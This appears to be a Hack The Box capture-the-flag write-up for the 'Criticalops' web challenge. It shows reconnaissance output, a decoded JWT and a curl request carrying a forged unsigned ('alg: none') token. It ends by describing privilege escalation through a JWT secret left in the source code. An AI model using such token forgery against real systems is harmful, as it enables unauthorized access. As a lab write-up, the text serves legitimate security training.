---
slug: /write-up/htb/challenges/critical-ops
pagination_next: null
pagination_prev: null
---

# Criticalops

https://app.hackthebox.com/challenges/Criticalops

Criticalops is a web app used to monitor critical infrastructure in the XYZ region. Users submit tickets to report unusual behavior. Please uncover potential vulnerabilities, and retrieve the hidden flag within the system.

The first thing we see is a self-signed certificate, which might be interesting to explore.

Whatweb reveals it is nextjs:

```bash
https://94.237.50.221:51712/ [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.26.3], IP[94.237.50.221], Script, Title[CriticalOps - Infrastructure Management], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.26.3]
```

We can register and see dashboards and so on. Cannot do much, just a form to create tickets. This might be a good opportunity for XSS or something related with forms.

In the ticket section, we can see a JWT token passed, decoding it we see:

```json
{
  "userId": "15f0d261-88f0-4092-bbe9-6990b0bf9cfc",
  "username": "test",
  "role": "user",
  "iat": 1754239502,
  "exp": 1754268302
}
```

We could try a JWT Confussion attack to be able to modify it maybe. We can modify the token and sign it with the public key because we have the certificate info. We can download the certificate and extract the public key using `openssl`.

curl -k 'https://94.237.54.192:57646/api/tickets' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Referer: https://94.237.54.192:57646/tickets' \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' \
  -H 'Content-Type: application/json' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: authToken=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJiMTQ1NGQ1ZC1mM2ZmLTQ3ZjItODU4YS1mNDNhODdjNWM1ODMiLCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidGVzdCIsImlhdCI6MTg1NDMyMTQ2MiwiZXhwIjoxODU0MzUwMjYyfQ.' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Priority: u=4'

  No luck with the confussion attack. Let's check the source code.

  It looks like the secret to generate the JWT token is included in the source code. We can generate a JWT with role "admin" using the secret and boom, we got the token.

  Remember, if available, check the code for secrets!